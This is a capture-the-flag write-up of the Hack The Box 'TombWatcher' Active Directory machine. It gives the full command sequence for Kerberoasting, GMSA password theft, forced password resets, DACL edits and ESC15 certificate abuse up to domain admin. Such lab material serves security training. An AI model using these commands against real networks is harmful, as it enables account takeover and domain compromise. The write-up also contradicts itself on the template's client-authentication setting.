---
icon: axe
---

# HTB-TOMBWATCHER

<figure><img src="../../../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

## Machine Info

This writeup details the process of exploiting the "TombWatcher" machine from Hack The Box (HTB), a Windows-based Active Directory (AD) environment rated as **Medium** difficulty with **30 points** and a release date of **07 Jun 2025**. The objective is to gain user and root access by leveraging provided credentials, enumerating AD permissions with BloodHound, exploiting misconfigurations, and abusing certificate templates. The writeup is formatted for Notion and provides a detailed, step-by-step guide.

## Attack Chain Flow

### Overview

This exploitation follows a multi-stage privilege escalation path through Active Directory misconfigurations:

**henry (initial creds)** → **alfred (Kerberoast)** → **Infrastructure group** → **ansible\_dev$ (GMSA)** → **sam** → **john (user flag)** → **cert\_admin (restored)** → **Administrator (root flag)**

***

### Key Vulnerabilities Exploited

1. **WriteSPN Permission** - Enabled Kerberoasting attack
2. **AddSelf Permission** - Group membership manipulation
3. **ReadGMSAPassword** - Service account credential theft
4. **Password Reset Rights** - Lateral movement via password changes
5. **GenericAll on OU** - Full control over organizational unit
6. **AD Recycle Bin** - Recovered deleted privileged account
7. **ESC15 (ADCS)** - Certificate template misconfiguration allowing subject specification

***

### Initial Enumeration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/tomwatcher]
└─$ rustscan -a 10.10.11.72 \ Blah blah blah  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.

Scanning DC01.tombwatcher.htb (10.10.11.72) [18 ports]
Discovered open port 53/tcp on 10.10.11.72
Discovered open port 139/tcp on 10.10.11.72
Discovered open port 445/tcp on 10.10.11.72
Discovered open port 49691/tcp on 10.10.11.72
Discovered open port 49711/tcp on 10.10.11.72
Discovered open port 135/tcp on 10.10.11.72
Discovered open port 49666/tcp on 10.10.11.72
Discovered open port 5985/tcp on 10.10.11.72
Discovered open port 80/tcp on 10.10.11.72
Discovered open port 464/tcp on 10.10.11.72
Discovered open port 49714/tcp on 10.10.11.72
Discovered open port 9389/tcp on 10.10.11.72
Discovered open port 593/tcp on 10.10.11.72
Discovered open port 636/tcp on 10.10.11.72
Discovered open port 49693/tcp on 10.10.11.72
Discovered open port 49692/tcp on 10.10.11.72
Discovered open port 389/tcp on 10.10.11.72
Discovered open port 88/tcp on 10.10.11.72
Completed SYN Stealth Scan at 11:29, 0.70s elapsed (18 total ports)

<SNIP>

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-11 15:29:18Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49711/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

<SNIP>

```

#### Objective

Use provided credentials to enumerate AD permissions and identify privilege escalation paths.

1. **Setting Up BloodHound**
   *   Used the provided credentials (`henry / H3Noto98765`) to collect AD data with `bloodhound-python`:

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$ bloodhound-python -u 'henry' -p 'H3Noto98765' -d tombwatcher.htb -c All --zip -ns 10.10.11.72
       ```
   * Imported the generated ZIP file into BloodHound and marked the `henry` user as **Owned** to analyze its permissions.
2. **Analyzing Henry’s Permissions**
   * Navigated to **Outbound Object Control** for `HENRY@TOMBWATCHER.HTB` in BloodHound.
   * Discovered that `henry` has **WriteSPN** permissions on `ALFRED@TOMBWATCHER.HTB`, allowing the addition of Service Principal Names (SPNs) to the `alfred` account.

***

### Exploitation: Kerberoasting Alfred

#### Objective

Abuse `WriteSPN` to add a fake SPN to `alfred`, perform a Kerberoast attack, and crack `alfred`’s password.

1. **Adding a Fake SPN**
   *   Created a Python script (`add_spn.py`) to add a fake SPN (`love/sn0x`) to the `alfred` account:

       ```python
       from ldap3 import Server, Connection, ALL, MODIFY_ADD
       import sys

       dc_ip = '10.10.11.72'
       domain = 'tombwatcher.htb'
       username = 'henry'
       password = 'H3Noto98765'
       target_user = 'alfred'
       fake_spn = 'love/sn0x'

       server = Server(dc_ip, get_info=ALL)
       conn = Connection(server, user=f'{domain}\\\\{username}', password=password, authentication='NTLM', auto_bind=True)

       conn.search(search_base=f"dc={domain.split('.')[0]},dc={domain.split('.')[1]}",
                   search_filter=f"(sAMAccountName={target_user})",
                   attributes=['distinguishedName'])
       dn = conn.entries[0].distinguishedName.value
       conn.modify(dn, {'servicePrincipalName': [(MODIFY_ADD, [fake_spn])]})
       if conn.result['description'] == 'success':
           print(f'[+] Successfully added SPN {fake_spn} to {target_user}')
       else:
           print('[-] Failed to add SPN:', conn.result)
           
       conn.unbind()

       ```
   *   Executed the script:

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$  python3 add_spn.py
       [+] Successfully added SPN love/sn0x to alfred

       ```
2. **Kerberoasting Alfred**
   *   Synchronized the attacker’s time with the domain controller to avoid Kerberos ticket issues:

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$  sudo rdate -n 10.10.11.72

       ```
   *   Used `targetedKerberoast` to retrieve `alfred`’s Kerberos hash:

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$  python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u henry -p 'H3Noto98765' --dc-ip 10.10.11.72

       ```

       * Tool source: [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
   *   Alternatively, used Impacket’s `GetUserSPNs`:

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$  impacket-GetUserSPNs tombwatcher.htb/henry:'H3Noto98765' -dc-ip 10.10.11.72 -request

       ```
3. **Cracking Alfred’s Password**
   * Saved the retrieved Kerberos hash to `hash.txt`.
   *   Cracked the hash using `hashcat` with the `rockyou.txt` wordlist:

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$  hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

       ```
   * Obtained `alfred`’s password: `basketball`.

***

### Privilege Escalation: Adding Alfred to Infrastructure Group

#### Objective

Use `alfred`’s credentials to escalate privileges by adding `alfred` to the `Infrastructure` group.

1. **Analyzing Alfred’s Permissions**
   * Marked `ALFRED@TOMBWATCHER.HTB` as **Owned** in BloodHound.
   * Navigated to **Outbound Object Control** and found that `alfred` has **AddSelf** permissions on the `Infrastructure` group, allowing `alfred` to add itself to the group.
2. **Adding Alfred to Infrastructure Group**
   * **Method 1: Using LDIF File**
     *   Created an LDIF file (`InfrastructureGroup.ldif`):

         ```
         dn: CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb
         changetype: modify
         add: member
         member: CN=Alfred,CN=Users,DC=tombwatcher,DC=htb

         ```
     *   Applied the LDIF file using `ldapmodify`:

         ```bash
         ldapmodify -x -D "tombwatcher\\\\alfred" -w basketball -H ldap://10.10.11.72 -f InfrastructureGroup.ldif

         ```
   * **Method 2: Using BloodyAD**
     *   Used `bloodyAD` to add `alfred` to the `Infrastructure` group:

         ```bash
         (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
         └─$  bloodyAD -d tombwatcher.htb -u alfred -p basketball --host 10.10.11.72 add groupMember 'CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb' 'CN=Alfred,CN=Users,DC=tombwatcher,DC=htb'
         [+] CN=Alfred,CN=Users,DC=tombwatcher,DC=htb added to CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb

         ```
3. **Verifying Group Membership**
   * Confirmed `alfred` is now a member of the `Infrastructure` group in BloodHound.

***

### Privilege Escalation: Reading GMSA Password

#### Objective

Use `Infrastructure` group privileges to read the Group Managed Service Account (GMSA) password for `ansible_dev$`.

1. **Analyzing Infrastructure Group Permissions**
   * Marked `INFRASTRUCTURE@TOMBWATCHER.HTB` as **Owned** in BloodHound.
   * Navigated to **Outbound Object Control** and found that the `Infrastructure` group has **ReadGMSAPassword** permissions on `ANSIBLE_DEVS@TOMBWATCHER.HTB`.
2. **Extracting GMSA Password**
   *   Used `gMSADumper.py` to retrieve the GMSA password for `ansible_dev$`:

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$  python3 gMSADumper.py -u alfred -p basketball -l 10.10.11.72 -d tombwatcher.htb

       ```

       * Tool source: [https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)
   * Obtained the NTLM hash: `1c37d00093dc2acf25a7z7f2d471fake4afdc`.

***

### Privilege Escalation: Resetting Sam’s Password

#### Objective

Use `ansible_dev$`’s privileges to reset the password for the `sam` user.

1. **Analyzing Ansible\_Dev$ Permissions**
   * Marked `ANSIBLE_DEV$@TOMBWATCHER.HTB` as **Owned** in BloodHound.
   * Found that `ansible_dev$` can change the password for `SAM@TOMBWATCHER.HTB`.
2. **Resetting Sam’s Password**
   *   **Method 1: Using BloodyAD**

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$ bloodyAD -u 'ansible_dev$' -p ':1c37d00093dc2acf25a7z7f2d471fake4afdc' -d tombwatcher.htb --dc-ip 10.10.11.72 set password sam 'Password123!'

       ```
   *   **Method 2: Using pth-net**

       ```bash
       pth-net rpc password "sam" 'NewP@ssword1234!' -U "tombwatcher/ansible_dev$%aaaaaaaaaaaaaaaa:1c37d00093dc2acf25a7z7f2d471fake4afdc" -S "10.10.11.72"

       ```
3. **Verifying Sam’s Access**
   * Marked `SAM@TOMBWATCHER.HTB` as **Owned** in BloodHound.

***

### Privilege Escalation: Gaining Control Over John

<figure><img src="../../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

#### Objective

Use `sam`’s permissions to gain control over the `john` user and access the user flag.

1. **Analyzing Sam’s Permissions**
   * Navigated to **Outbound Object Control** for `SAM@TOMBWATCHER.HTB` in BloodHound.
   * Found that `sam` can modify the `JOHN@TOMBWATCHER.HTB` user object.
2. **Granting Sam Full Control Over John**
   *   Set `sam` as the owner of `john`:

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$ impacket-owneredit -action write -new-owner 'sam' -target 'john' 'tombwatcher/sam:NewP@ssword1234!' -dc-ip 10.10.11.72

       ```
   *   Granted `sam` **FullControl** permissions over `john`:

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$  impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher/sam:NewP@ssword1234!' -dc-ip 10.10.11.72

       ```
3. **Resetting John’s Password**
   *   Changed `john`’s password using `bloodyAD`:

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$ bloodyAD -u 'sam' -p 'NewP@ssword1234!' -d tombwatcher.htb --dc-ip 10.10.11.72 set password john 'NewPassword123!'

       ```
4. **Accessing the User Flag**
   *   Logged in as `john` via `evil-winrm`:

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$  evil-winrm -i 10.10.11.72 -u john -p 'NewPassword123!'

       ```
   *   Retrieved the user flag:

       ```powershell
       type C:\\Users\\john\\Desktop\\user.txt

       ```

***

### Root Privilege Escalation: Enumerating ADCS

<figure><img src="../../../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

#### Objective

Escalate from `john` to domain admin by exploiting Active Directory Certificate Services (ADCS) vulnerabilities.

1. **Further AD Enumeration**
   *   Uploaded `SharpHound.exe` to the target as `john`:

       ```powershell
       upload SharpHound.exe

       ```
   *   Executed `SharpHound` to collect additional AD data:

       ```powershell
       .\\SharpHound.exe

       ```
   *   Downloaded the generated ZIP file:

       ```powershell
       download 20250680115428_Bloodhound.zip

       ```
   * Imported the new data into BloodHound.
2. **Analyzing John’s Permissions**
   * Marked `JOHN@TOMBWATCHER.HTB` as **Owned**.
   * Found that `john` has **GenericAll** permissions on the `ADCS@TOMBWATCHER.HTB` Organizational Unit (OU).
3. **Granting Full Control Over ADCS OU**
   *   Modified the Access Control List (ACL) to grant `john` full control over the `ADCS` OU and its child objects:

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$ impacket-dacledit -action write -rights FullControl -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' 'tombwatcher.htb/john:NewPassword123!' -dc-ip 10.10.11.72

       ```
4. **Checking the Recycle Bin**
   *   Used PowerShell to enumerate deleted objects in the AD recycle bin:

       ```powershell
       Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid,lastKnownParent,ObjectGUID | Select-Object Name,ObjectGUID,objectSid,lastKnownParent | Format-List

       ```
   *   Output:

       ```
       Name            : cert_admin DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
       ObjectGUID      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
       objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1109
       lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

       Name            : cert_admin DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
       ObjectGUID      : c1f1f0fe-df9c-494c-bf05-0679e181b358
       objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1110
       lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

       Name            : cert_admin DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
       ObjectGUID      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
       objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1111
       lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

       ```
   * Selected the third object (`DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf`) for restoration.
5. **Restoring and Enabling Cert\_Admin**
   *   Restored the deleted `cert_admin` user:

       ```powershell
       Restore-ADObject -Identity '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'

       ```
   *   Set a new password for `cert_admin`:

       ```powershell
       Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewP@ssw0rd123" -Force)

       ```
   *   Enabled the account:

       ```powershell
       Enable-ADAccount -Identity cert_admin

       ```

***

### Root Privilege Escalation: Exploiting ADCS Vulnerability (ESC15)

<figure><img src="../../../../.gitbook/assets/image (500).png" alt=""><figcaption></figcaption></figure>

#### Objective

Use `cert_admin` to exploit a vulnerable certificate template and gain Administrator access.

1. **Identifying Vulnerable Certificate Template**
   *   Ran `certipy find` to enumerate certificate templates:

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$ certipy find -u 'cert_admin' -p 'NewP@ssw0rd123' -dc-ip 10.10.11.72 -vulnerable -stdout

       ```
   * Identified the `WebServer` template as vulnerable to **ESC15** due to:
     * `EnrolleeSuppliesSubject`: True (allows the enrollee to specify the subject name)
     * Enabled for client authentication
     * No manager approval required
   *   Template details:

       ```
       Template Name: WebServer
       Display Name: Web Server
       Certificate Authorities: tombwatcher-CA-1
       Enabled: True
       Client Authentication: False
       Enrollee Supplies Subject: True
       Extended Key Usage: Server Authentication
       Requires Manager Approval: False
       Schema Version: 1
       Validity Period: 2 years
       Renewal Period: 6 weeks
       Minimum RSA Key Length: 2048

       ```
2. **Requesting an Administrator Certificate**
   *   Used `certipy req` to request a certificate for `administrator@tombwatcher.htb`:

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$ certipy req -dc-ip 10.10.11.72 -ca 'tombwatcher-CA-1' -target-ip 10.10.11.72 -u cert_admin@tombwatcher.htb -p 'NewP@ssw0rd123' -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'
       ```
   * Saved the certificate to `administrator.pfx`.
3. **Authenticating as Administrator**
   *   Used `certipy auth` to authenticate with the forged certificate and reset the `Administrator` password:

       ```bash
       (sn0x㉿sn0x)-[~/hackthebox/Tombwatcher]
       └─$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell

       ```
   *   In the LDAP shell, changed the `Administrator` password:

       ```
       change_password Administrator NewP@ssw0rd123

       ```
   *   Alternatively, logged in as `Administrator` via `evil-winrm`:

       ```bash
       evil-winrm -i 10.10.11.72 -u Administrator -p 'NewP@ssw0rd123'

       ```
   *   Retrieved the root flag:

       ```powershell
       type C:\\Users\\Administrator\\Desktop\\root.txt

       ```

***

### Summary

* **Initial Access**: Used provided credentials (`henry / H3Noto98765`) to enumerate AD with BloodHound.
* **Kerberoasting Alfred**: Added a fake SPN to `alfred`, performed a Kerberoast attack, and cracked the password (`basketball`).
* **Infrastructure Group Membership**: Added `alfred` to the `Infrastructure` group using `ldapmodify` or `bloodyAD`.
* **GMSA Password Extraction**: Retrieved the `ansible_dev$` GMSA password using `gMSADumper`.
* **Sam Password Reset**: Reset `sam`’s password using `ansible_dev$`’s privileges.
* **John Access**: Gained control over `john` by setting `sam` as owner and granting full control, then accessed the user flag.
* **ADCS Enumeration**: Used `john`’s `GenericAll` on the `ADCS` OU to restore the `cert_admin` user from the recycle bin.
* **Root Access**: Exploited the `WebServer` certificate template (ESC15) with `cert_admin` to forge an `Administrator` certificate and gain domain admin access.

This writeup demonstrates a complex AD attack chain involving Kerberoasting, group membership manipulation, GMSA exploitation, and ADCS vulnerabilities, highlighting the importance of securing AD permissions and certificate templates.

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>

***
